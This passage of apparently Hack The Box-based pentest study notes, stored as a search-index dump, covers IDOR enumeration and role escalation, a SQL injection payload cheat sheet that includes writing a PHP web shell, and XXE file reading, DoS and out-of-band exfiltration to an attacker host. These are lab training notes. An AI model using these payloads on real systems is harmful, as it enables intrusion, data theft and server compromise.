toString (), }, \"POST\" , \"_self\" ); } Function appears to be sending a POST request with the contract parameter, which is what we saw above. The value it is sending is an md5 hash using the CryptoJS library. In this case, the value being hashed is btoa(uid) , which is the base64 encoded string of the uid variable, which is an input argument for the function. We can test this by base64 encoding our uid=1 , and then hashing it with md5 , as follows: hrmns@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum cdd96d3cc73d1dbdaffa03cc6cd7339b - We are using the -n flag with echo , and the -w 0 flag with base64 , to avoid adding newlines, in order to be able to calculate the md5 hash of the same value, without hashing newlines, as that would change the final md5 hash. This hash matches the hash in our request, meaning that we have successfully reversed the hashing technique used on the object references, turning them into IDOR's. We can begin enumerating other employees' contracts using the same hashing method we used above.","title":"Function Disclosure"},{"location":"attacking_web_applications/idor/#mass-enumeration","text":"Simple bash script to retrieve all employee contracts. More often than not, this is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities. hrmns@htb[/htb]$ for i in { 1 ..10 } ; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -' ; done cdd96d3cc73d1dbdaffa03cc6cd7339b 0b7e7dee87b1c3b98e72131173dfbbbf 0b24df25fe628797b3a50ae0724d2730 f7947d50da7a043693a592b4db43b0a1 8b9af1f7f76daf0f02bd9c48c4a2e3d0 006d1236aee3f92b8322299796ba1989 b523ff8d1ced96cef9c86492e790c2fb d477819d240e7d3dd9499ed8d23e7158 3e57e65a34ffcb2e93cb545d024f5bde 5d4aace023dc088767b4e08c79415dcd Next, make a POST request on download.php with each of the above hashes as the contract value, which should give us our final script: #!/bin/bash for i in { 1 ..10 } ; do for hash in $( echo -n $i | base64 -w 0 | md5sum | tr -d ' -' ) ; do curl -sOJ -X POST -d \"contract= $hash \" http://SERVER_IP:PORT/download.php done done With that, we can run the script, and it should download all contracts for employees 1-10: hrmns@htb[/htb]$ bash ./exploit.sh hrmns@htb[/htb]$ ls -1 contract_006d1236aee3f92b8322299796ba1989.pdf contract_0b24df25fe628797b3a50ae0724d2730.pdf contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf contract_5d4aace023dc088767b4e08c79415dcd.pdf contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf contract_b523ff8d1ced96cef9c86492e790c2fb.pdf contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf contract_d477819d240e7d3dd9499ed8d23e7158.pdf contract_f7947d50da7a043693a592b4db43b0a1.pdf","title":"Mass Enumeration"},{"location":"attacking_web_applications/idor/#idor-in-insecure-apis","text":"IDOR vulnerabilities may also exist in function calls and APIs, and exploiting them would allow us to perform various actions as other users. While IDOR Information Disclosure Vulnerabilities allow us to read various types of resources, IDOR Insecure Function Calls enable us to call APIs or execute functions as another user.","title":"IDOR in insecure APIs"},{"location":"attacking_web_applications/idor/#identifying-insecure-apis","text":"We can start testing the Edit Profile page for IDOR vulnerabilities: Click on the Edit Profile button, we are taken to a page to edit information of our user profile, namely Full Name , Email , and About Me : Change any of the details in our profile and click Update profile , and we'll see that they get updated and persist through refreshes, which means they get updated in a database somewhere. Intercept the Update request in Burp and look at it: The page is sending a PUT request to the /profile/api.php/profile/1 API endpoint. PUT requests are usually used in APIs to update item details, while POST is used to create new items, DELETE to delete items, and GET to retrieve item details. So, a PUT request for the Update profile function is expected. The interesting bit is the JSON parameters it is sending: { \"uid\" : 1 , \"uuid\" : \"40f5888b67c748df7efba008e7c2f9d2\" , \"role\" : \"employee\" , \"full_name\" : \"Amy Lindon\" , \"email\" : \"a_lindon@employees.htb\" , \"about\" : \"A Release is like a boat. 80% of the holes plugged is not good enough.\" } The PUT request includes a few hidden parameters, like uid, uuid , and most interestingly role , which is set to employee . The web application also appears to be setting the user access privileges (e.g. role ) on the client-side, in the form of our Cookie: role=employee cookie, which appears to reflect the role specified for our user. This is a common security issue. The access control privileges are sent as part of the client's HTTP request, either as a cookie or as part of the JSON request, leaving it under the client's control, which could be manipulated to gain more privileges. Unless the web application has a solid access control system on the back-end, we should be able to set an arbitrary role for our user, which may grant us more privileges .","title":"Identifying Insecure APIs"},{"location":"attacking_web_applications/idor/#exploiting-insecure-apis","text":"Start by changing our uid to another user's uid (e.g. \" uid \": 2 ). However, any number we set other than our own uid gets us a response of uid mismatch : The web application appears to be comparing the request's uid to the API endpoint ( /1 ). This means that a form of access control on the back-end prevents us from arbitrarily changing some JSON parameters, which might be necessary to prevent the web application from crashing or returning errors. We'll change the API endpoint to /profile/api.php/profile/2 , and change \"uid\": 2 to avoid the previous uid mismatch : This time, we get an error message saying uuid mismatch . Application appears to be checking if the uuid value we are sending matches the user's uuid . Since we are sending our own uuid , our request is failing. This appears to be another form of access control to prevent users from changing another user's details. Let's see if we can create a new user with a POST request to the API endpoint. We can change the request method to POST , change the uid to a new uid , and send the request to the API endpoint of the new uid : Error: Creating new employees is for admins only . The same thing happens when we send a Delete request. The web application might be checking our authorization through the role=employee cookie because this appears to be the only form of authorization in the HTTP request. Finally, try changing role to admin/administrator to gain higher privileges. Unfortunately, without knowing a valid role name, we get Invalid role in the HTTP response, and our role does not update: So, is the web application secure against IDOR attacks? So far, we have only been testing the IDOR Insecure Function Calls . We have not tested the API's GET request for IDOR Information Disclosure Vulnerabilities .","title":"Exploiting Insecure APIs"},{"location":"attacking_web_applications/idor/#information-disclosure","text":"Send a GET request with another uid : This returned the details of another user, with their own uuid and role , confirming an IDOR Information Disclosure vulnerability : { \"uid\" : \"2\" , \"uuid\" : \"4a9bd19b3b8676199592a346051f950c\" , \"role\" : \"employee\" , \"full_name\" : \"Iona Franklyn\" , \"email\" : \"i_franklyn@employees.htb\" , \"about\" : \"It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it.\" } This provides new details, most notably the uuid .","title":"Information Disclosure"},{"location":"attacking_web_applications/idor/#modifying-other-users-details","text":"With the user's uuid at hand, we can change this user's details by sending a PUT request to /profile/api.php/profile/2 No error this time, GET user details we see it's indeed updated: ) The ability to modify another user's details also enables us to perform several other attacks. E.g. modifying a user's email address and then requesting a password reset link, which will be sent to the email address we specified, allowing us to take control over their account. Another potential attack is placing an XSS payload in the 'about' field , which would get executed once the user visits their Edit profile page, enabling us to attack the user in different ways.","title":"Modifying Other User's Details"},{"location":"attacking_web_applications/idor/#chaining-two-idor-vulnerabilities","text":"Look for other roles , ideally an admin role. { \"uid\" : \"X\" , \"uuid\" : \"a36fa9e66e85f2dd6f5e13cad45248ae\" , \"role\" : \"web_admin\" , \"full_name\" : \"administrator\" , \"email\" : \"webadmin@employees.htb\" , \"about\" : \"HTB{FLAG}\" } The admin role name ( web_admin ), we can set it to our user so we can create new users or delete current users. To do so, we will intercept the request when we click on the Update profile button and change our role to web_admin : We do not get the Invalid role error message, nor do we get any access control error messages, meaning that there are no back-end access control measures to what roles we can set for our user. If we GET our user details, we see that our role has indeed been set to web_admin : { \"uid\" : \"1\" , \"uuid\" : \"40f5888b67c748df7efba008e7c2f9d2\" , \"role\" : \"web_admin\" , \"full_name\" : \"Amy Lindon\" , \"email\" : \"a_lindon@employees.htb\" , \"about\" : \"A Release is like a boat. 80% of the holes plugged is not good enough.\" } Refresh the page to update our cookie, or manually set it as Cookie: role=web_admin , and then intercept the Update request to create a new user and see if we'd be allowed to do so: No error message. If we send a GET request for the new user, we see that it has been successfully created: By combining the information we gained from the IDOR Information Disclosure vulnerability with an IDOR Insecure Function Calls attack on an API endpoint, we could modify other users' details and create/delete users while bypassing various access control checks in place. On many occasions, the information we leak through IDOR vulnerabilities can be utilized in other attacks, like IDOR or XSS, leading to more sophisticated attacks or bypassing existing security mechanisms.","title":"Chaining Two IDOR Vulnerabilities"},{"location":"attacking_web_applications/sql_injection/","text":"MySQL \u00b6 Command Description General mysql -u root -h docker.hackthebox.eu -P 3306 -p login to mysql database SHOW DATABASES List available databases USE users Switch to database Tables CREATE TABLE logins (id INT, ...) Add a new table SHOW TABLES List available tables in current database DESCRIBE logins Show table properties and columns INSERT INTO table_name VALUES (value_1,..) Add values to table INSERT INTO table_name(column2, ...) VALUES (column2_value, ..) Add values to specific columns in a table UPDATE table_name SET column1=newvalue1, ... WHERE <condition> Update table values Columns SELECT * FROM table_name Show all columns in a table SELECT column1, column2 FROM table_name Show specific columns in a table DROP TABLE logins Delete a table ALTER TABLE logins ADD newColumn INT Add new column ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn Rename column ALTER TABLE logins MODIFY oldColumn DATE Change column datatype ALTER TABLE logins DROP oldColumn Delete column Output SELECT * FROM logins ORDER BY column_1 Sort by column SELECT * FROM logins ORDER BY column_1 DESC Sort by column in descending order SELECT * FROM logins ORDER BY column_1 DESC, id ASC Sort by two-columns SELECT * FROM logins LIMIT 2 Only show first two results SELECT * FROM logins LIMIT 1, 2 Only show first two results starting from index 2 SELECT * FROM table_name WHERE <condition> List results that meet a condition SELECT * FROM logins WHERE username LIKE 'admin%' List results where the name is similar to a given string MySQL Operator Precedence \u00b6 Division ( / ), Multiplication ( * ), and Modulus ( % ) Addition ( + ) and Subtraction ( - ) Comparison ( = , > , < , <= , >= , != , LIKE ) NOT ( ! ) AND ( && ) OR ( || ) SQL Injection \u00b6 Payload Description Auth Bypass admin' or '1'='1 Basic Auth Bypass admin')-- - Basic Auth Bypass With comments Auth Bypass Payloads Union Injection ' order by 1-- - Detect number of columns using order by cn' UNION select 1,2,3-- - Detect number of columns using Union injection cn' UNION select 1,@@version,3,4-- - Basic Union injection UNION select username, 2, 3, 4 from passwords-- - Union injection for 4 columns DB Enumeration SELECT @@version Fingerprint MySQL with query output SELECT SLEEP(5) Fingerprint MySQL with no output cn' UNION select 1,database(),2,3-- - Current database name cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - List all databases cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - List all tables in a specific database cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - List all columns in a specific table cn' UNION select 1, username, password, 4 from dev.credentials-- - Dump data from a table in another database Privileges cn' UNION SELECT 1, user(), 3, 4-- - Find current user cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=\"root\"-- - Find if user has admin privileges cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=\"root\"-- - Find if all user privileges cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=\"secure_file_priv\"-- - Find which directories can be accessed through MySQL File Injection cn' UNION SELECT 1, LOAD_FILE(\"/etc/passwd\"), 3, 4-- - Read local file select 'file written successfully!' into outfile '/var/www/html/proof.txt' Write a string to a local file cn' union select \"\",'<?php system($_REQUEST[0]); ?>', \"\", \"\" into outfile '/var/www/html/shell.php'-- - Write a web shell into the base web directory","title":"SQLi"},{"location":"attacking_web_applications/sql_injection/#mysql","text":"Command Description General mysql -u root -h docker.hackthebox.eu -P 3306 -p login to mysql database SHOW DATABASES List available databases USE users Switch to database Tables CREATE TABLE logins (id INT, ...) Add a new table SHOW TABLES List available tables in current database DESCRIBE logins Show table properties and columns INSERT INTO table_name VALUES (value_1,..) Add values to table INSERT INTO table_name(column2, ...) VALUES (column2_value, ..) Add values to specific columns in a table UPDATE table_name SET column1=newvalue1, ... WHERE <condition> Update table values Columns SELECT * FROM table_name Show all columns in a table SELECT column1, column2 FROM table_name Show specific columns in a table DROP TABLE logins Delete a table ALTER TABLE logins ADD newColumn INT Add new column ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn Rename column ALTER TABLE logins MODIFY oldColumn DATE Change column datatype ALTER TABLE logins DROP oldColumn Delete column Output SELECT * FROM logins ORDER BY column_1 Sort by column SELECT * FROM logins ORDER BY column_1 DESC Sort by column in descending order SELECT * FROM logins ORDER BY column_1 DESC, id ASC Sort by two-columns SELECT * FROM logins LIMIT 2 Only show first two results SELECT * FROM logins LIMIT 1, 2 Only show first two results starting from index 2 SELECT * FROM table_name WHERE <condition> List results that meet a condition SELECT * FROM logins WHERE username LIKE 'admin%' List results where the name is similar to a given string","title":"MySQL"},{"location":"attacking_web_applications/sql_injection/#mysql-operator-precedence","text":"Division ( / ), Multiplication ( * ), and Modulus ( % ) Addition ( + ) and Subtraction ( - ) Comparison ( = , > , < , <= , >= , != , LIKE ) NOT ( ! ) AND ( && ) OR ( || )","title":"MySQL Operator Precedence"},{"location":"attacking_web_applications/sql_injection/#sql-injection","text":"Payload Description Auth Bypass admin' or '1'='1 Basic Auth Bypass admin')-- - Basic Auth Bypass With comments Auth Bypass Payloads Union Injection ' order by 1-- - Detect number of columns using order by cn' UNION select 1,2,3-- - Detect number of columns using Union injection cn' UNION select 1,@@version,3,4-- - Basic Union injection UNION select username, 2, 3, 4 from passwords-- - Union injection for 4 columns DB Enumeration SELECT @@version Fingerprint MySQL with query output SELECT SLEEP(5) Fingerprint MySQL with no output cn' UNION select 1,database(),2,3-- - Current database name cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - List all databases cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - List all tables in a specific database cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - List all columns in a specific table cn' UNION select 1, username, password, 4 from dev.credentials-- - Dump data from a table in another database Privileges cn' UNION SELECT 1, user(), 3, 4-- - Find current user cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=\"root\"-- - Find if user has admin privileges cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=\"root\"-- - Find if all user privileges cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=\"secure_file_priv\"-- - Find which directories can be accessed through MySQL File Injection cn' UNION SELECT 1, LOAD_FILE(\"/etc/passwd\"), 3, 4-- - Read local file select 'file written successfully!' into outfile '/var/www/html/proof.txt' Write a string to a local file cn' union select \"\",'<?php system($_REQUEST[0]); ?>', \"\", \"\" into outfile '/var/www/html/shell.php'-- - Write a web shell into the base web directory","title":"SQL Injection"},{"location":"attacking_web_applications/xxe/","text":"XXE \u00b6 XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XML \u00b6 Extensible Markup Language (XML) is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displaying data but mostly on storing documents' data and representing data structures. Basic example of an XML document representing an e-mail document structure: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <email> <date> 01-01-2022 </date> <time> 10:00 am UTC </time> <sender> john@inlanefreight.com </sender> <recipients> <to> HR@inlanefreight.com </to> <cc> <to> billing@inlanefreight.com </to> <to> payslips@inlanefreight.com </to> </cc> </recipients> <body> Hello, Kindly share with me the invoice for the payment made on January 1, 2022. Regards, John </body> </email> Key Definition Example Tag The keys of an XML document, usually wrapped with ( < / > ) characters. <date> Entity XML variables, usually wrapped with ( & / ; ) characters. &lt; Element The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. <date>01-01-2022</date> Attribute Optional specifications for any element that are stored in the tags, which may be used by the XML parser. version=\"1.0\" / encoding=\"UTF-8\" Declaration Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it. <?xml version=\"1.0\" encoding=\"UTF-8\"?> Some characters are used as part of an XML document structure, like < , > , & , or \" . So, if we need to use them in an XML document, we should replace them with their corresponding entity references (e.g. &lt; , &gt; , &amp; , &quot; ). XML DTD \u00b6 XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. <!DOCTYPE email [ <!ELEMENT email (date, time, sender, recipients, body)> <!ELEMENT recipients (to, cc?)> <!ELEMENT cc (to*)> <!ELEMENT date (#PCDATA)> <!ELEMENT time (#PCDATA)> <!ELEMENT sender (#PCDATA)> <!ELEMENT to (#PCDATA)> <!ELEMENT body (#PCDATA)> ]> DTD is declaring the root email element with the ELEMENT type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by PCDATA ). Above DTD can be placed within the XML document itself, right after the XML Declaration in the first line. Otherwise, it can be stored in an external file (e.g. email.dtd) , and then referenced within the XML document with the SYSTEM keyword <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email SYSTEM \"email.dtd\"> Reference DTD through a URL: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email SYSTEM \"http://inlanefreight.com/email.dtd\"> XML Entities \u00b6 Define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email [ <!ENTITY company \"Inlane Freight\"> ]> Once we define an entity, it can be referenced in an XML document between an ampersand & and a semi-colon ; (e.g. &company; ). Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, we can reference External XML Entities with the SYSTEM keyword, which is followed by the external entity's path <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email [ <!ENTITY company SYSTEM \"http://localhost/company.txt\"> <!ENTITY signature SYSTEM \"file:///var/www/html/signature.txt\"> ]> Local File Disclosure \u00b6 If we fill the contact form and click on Send Data , then intercept the HTTP request with Burp, we get the following request: If we send the form without any modification, we get the following message: We see that the value of the email element is being displayed back to us on the page. To print the content of an external file to the page, we should note which elements are being displayed, such that we know which elements to inject into . we know that whatever value we place in the <email></email> element gets displayed in the HTTP response. Define a new entity and then use it as a variable in the email element to see whether it gets replaced with the value we defined. <!DOCTYPE email [ <!ENTITY company \"Inlane Freight\"> ]> We should have a new XML entity called company , which we can reference with &company ;. So, instead of using our email in the email element, let us try using &company ;, and see whether it will be replaced with the value we defined ( Inlane Freight ): The response did use the value of the entity we defined ( Inlane Freight ) instead of displaying &company; , indicating that we may inject XML code. This confirms that we are dealing with a web application vulnerable to XXE. Reading Sensitive Files \u00b6 <!DOCTYPE email [ <!ENTITY company SYSTEM \"file:///etc/passwd\"> ]> Send the modified request and see whether the value of our external XML entity gets set to the file we reference: Reading Source Code \u00b6 This would allow us to perform a Whitebox Penetration Test to unveil more vulnerabilities in the web application, or at the very least reveal secret configurations like database passwords or API keys. This did not work. This happened because the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity . PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format <!DOCTYPE email [ <!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]> This trick only works with PHP web applications. Other XXE Attacks \u00b6 In addition to reading local files, we may execute commands on the back-end with the PHP://expect filter or utilize a hash stealing trick in Windows-based web applications. One common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload: <?xml version=\"1.0\"?> <!DOCTYPE data [ <!ENTITY a0 \"DOS\" > <!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\"> <!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\"> <!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\"> <!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\"> <!ENTITY a5 \"&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;\"> <!ENTITY a6 \"&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;\"> <!ENTITY a7 \"&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;\"> <!ENTITY a8 \"&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;\"> <!ENTITY a9 \"&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;\"> <!ENTITY a10 \"&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;\"> ]> <root> <name></name> <tel></tel> <email> &a10; </email> <message></message> </root> This payload defines the a0 entity as DOS , references it in a1 multiple times, references a1 in a2 , and so on until the back-end server's memory runs out due to the self-reference loops. However, this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference . Advanced Exfiltration with CDATA \u00b6 Let's try to read the submitDetails.php file by first storing below line in a DTD file (e.g. xxe.dtd ), host it on our machine, and then reference it as an external entity on the target web application hrmns@htb[/htb]$ echo '<!ENTITY joined \"%begin;%file;%end;\">' > xxe.dtd hrmns@htb[/htb]$ python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Reference our external entity ( xxe.dtd ) and then print the &joined; entity we defined above, which should contain the content of the file: <!DOCTYPE email [ <!ENTITY % begin \"<![CDATA[\"> <!-- prepend the beginning of the CDATA tag --> <!ENTITY % file SYSTEM \"file:///var/www/html/submitDetails.php\"> <!-- reference external file --> <!ENTITY % end \"]]> \"> <!-- append the end of the CDATA tag --> <!ENTITY % xxe SYSTEM \"http://OUR_IP:8000/xxe.dtd\"> <!-- reference our external DTD --> %xxe; ]> ... <email> &joined; </email> <!-- reference the &joined; entity to print the file content --> Once we write our xxe.dtd file, host it on our machine, and then add the above lines to our HTTP request to the vulnerable web application, we can finally get the content of the submitDetails.php file: We were able to obtain the file's source code without needing to encode it to base64, which saves a lot of time when going through various files to look for secrets and passwords. In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop). This trick can become very handy when the basic XXE method does not work or when dealing with other web development frameworks. Error Based XXE \u00b6 Try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g. <roo> instead of <root> ), or just reference a non-existing entity We cause the web application to display an error, and it also revealed the web server directory, which we can use to read the source code of other files. Now, we can exploit this flaw to exfiltrate file content. First, host a DTD file that contains the following payload: <!ENTITY % file SYSTEM \"file:///etc/hosts\"> <!ENTITY % error \"<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'> \"> Above payload defines the file parameter entity and then joins it with an entity that does not exist. In this case, %nonExistingEntity; does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined %file; as part of the error. Call our external DTD script, and then reference the error entity: <!DOCTYPE email [ <!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"> %remote; %error; ]> Once we host our DTD script as we did earlier and send the above payload as our XML data (no need to include any other XML data), we will get the content of the /etc/hosts file: This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. \" file:///var/www/html/submitDetails.php \"). However, this method is not as reliable as the previous method for reading source files , as it may have length limitations, and certain special characters may still break it. Blind Data Exfiltration \u00b6 Instead of having the web application output our file entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading. We can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP: <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> <!ENTITY % oob \"<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>\"> If, the file we want to read had the content of XXE_SAMPLE_DATA , then the file parameter would hold its base64 encoded data ( WFhFX1NBTVBMRV9EQVRB ). When the XML tries to reference the external oob parameter from our machine, it will request http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB . Finally, we can decode the WFhFX1NBTVBMRV9EQVRB string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal: <?php if ( isset ( $_GET [ 'content' ])){ error_log ( \" \\n\\n \" . base64_decode ( $_GET [ 'content' ])); } ?> So, we will first write the above PHP code to index.php , and then start a PHP server on port 8000: hrmns@htb[/htb]$ vi index.php # here we write the above PHP code hrmns@htb[/htb]$ php -S 0 .0.0.0:8000 PHP 7.4.3 Development Server (http://0.0.0.0:8000) started To initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add <root>&content;</root> , which is needed to reference our entity and have it send the request to our machine with the file content: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email [ <!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"> %remote; %oob; ]> <root> &content; </root> Send request to web app: Finally, back to terminal, we did indeed get the request and its decoded content: PHP 7.4.3 Development Server (http://0.0.0.0:8000) started 10.10.14.16:46256 Accepted 10.10.14.16:46256 [200]: (null) /xxe.dtd 10.10.14.16:46256 Closing 10.10.14.16:46258 Accepted root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...SNIP... Automated OOB Exfiltration \u00b6 Although in some instances we may have to use the manual method we learned above, in many other cases, we can automate the process of blind XXE data exfiltration with tools. hrmns@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git Cloning into 'XXEinjector'... ...SNIP... Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write XXEINJECT after it as a position locator for the tool: POST /blind/submitDetails.php HTTP/1.1 Host: 10.129.201.94 Content-Length: 169 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Content-Type: text/plain;charset=UTF-8 Accept: */* Origin: http://10.129.201.94 Referer: http://10.129.201.94/blind/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close <?xml version=\"1.0\" encoding=\"UTF-8\"?> XXEINJECT Run the tool with the --host / --httpport flags being our IP and port, the --file flag being the file we wrote above, and the --path flag being the file we want to read. Also select the --oob=http and --phpfilter flags to repeat the OOB attack we did above: hrmns@htb[/htb]$ ruby XXEinjector.rb --host = 127 .0.0.1 --httpport = 8000 --file = /tmp/xxe.req --path = /etc/passwd --oob = http --phpfilter ...SNIP... [+] Sending request with malicious XML. [+] Responding with XML for: /etc/passwd [+] Retrieved data: We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the Logs folder under the tool, and we can find our file there: hrmns@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ...SNIP..","title":"XML External Entity (XXE) Injection"},{"location":"attacking_web_applications/xxe/#xxe","text":"XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.","title":"XXE"},{"location":"attacking_web_applications/xxe/#xml","text":"Extensible Markup Language (XML) is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displaying data but mostly on storing documents' data and representing data structures. Basic example of an XML document representing an e-mail document structure: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <email> <date> 01-01-2022 </date> <time> 10:00 am UTC </time> <sender> john@inlanefreight.com </sender> <recipients> <to> HR@inlanefreight.com </to> <cc> <to> billing@inlanefreight.com </to> <to> payslips@inlanefreight.com </to> </cc> </recipients> <body> Hello, Kindly share with me the invoice for the payment made on January 1, 2022. Regards, John </body> </email> Key Definition Example Tag The keys of an XML document, usually wrapped with ( < / > ) characters. <date> Entity XML variables, usually wrapped with ( & / ; ) characters. &lt; Element The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. <date>01-01-2022</date> Attribute Optional specifications for any element that are stored in the tags, which may be used by the XML parser. version=\"1.0\" / encoding=\"UTF-8\" Declaration Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it. <?xml version=\"1.0\" encoding=\"UTF-8\"?> Some characters are used as part of an XML document structure, like < , > , & , or \" . So, if we need to use them in an XML document, we should replace them with their corresponding entity references (e.g. &lt; , &gt; , &amp; , &quot; ).","title":"XML"},{"location":"attacking_web_applications/xxe/#xml-dtd","text":"XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. <!DOCTYPE email [ <!ELEMENT email (date, time, sender, recipients, body)> <!ELEMENT recipients (to, cc?)> <!ELEMENT cc (to*)> <!ELEMENT date (#PCDATA)> <!ELEMENT time (#PCDATA)> <!ELEMENT sender (#PCDATA)> <!ELEMENT to (#PCDATA)> <!ELEMENT body (#PCDATA)> ]> DTD is declaring the root email element with the ELEMENT type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by PCDATA ). Above DTD can be placed within the XML document itself, right after the XML Declaration in the first line. Otherwise, it can be stored in an external file (e.g. email.dtd) , and then referenced within the XML document with the SYSTEM keyword <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email SYSTEM \"email.dtd\"> Reference DTD through a URL: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email SYSTEM \"http://inlanefreight.com/email.dtd\">","title":"XML DTD"},{"location":"attacking_web_applications/xxe/#xml-entities","text":"Define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email [ <!ENTITY company \"Inlane Freight\"> ]> Once we define an entity, it can be referenced in an XML document between an ampersand & and a semi-colon ; (e.g. &company; ). Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, we can reference External XML Entities with the SYSTEM keyword, which is followed by the external entity's path 